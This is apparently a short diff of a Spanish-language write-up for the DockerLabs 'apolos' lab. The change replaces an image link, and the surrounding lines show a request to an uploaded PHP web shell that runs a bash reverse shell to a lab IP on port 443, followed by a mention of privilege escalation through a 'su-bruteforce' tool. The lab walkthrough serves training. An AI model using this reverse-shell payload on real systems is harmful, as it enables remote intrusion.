@@ -80,7 +80,8 @@ ahora colocamos una bash
     http://172.17.0.2/uploads/shell.phtml?cmd=bash -c 'bash -i >%26   /dev/tcp/172.17.0.1/443 0>%261'
     
 mientras la terminal nuestra esta en escucha y tenemos conexión 
-![[dockerlabs/medio/apolos/conexion1.png]]
+![image](https://github.com/user-attachments/assets/c912d156-c0ec-4817-bc93-2bcdda680262)
+
 entramos y ahora escalamos.
 
 encontré que para escalar se utiliza "su-bruteforce" , buscamos alguna forma y encontré:
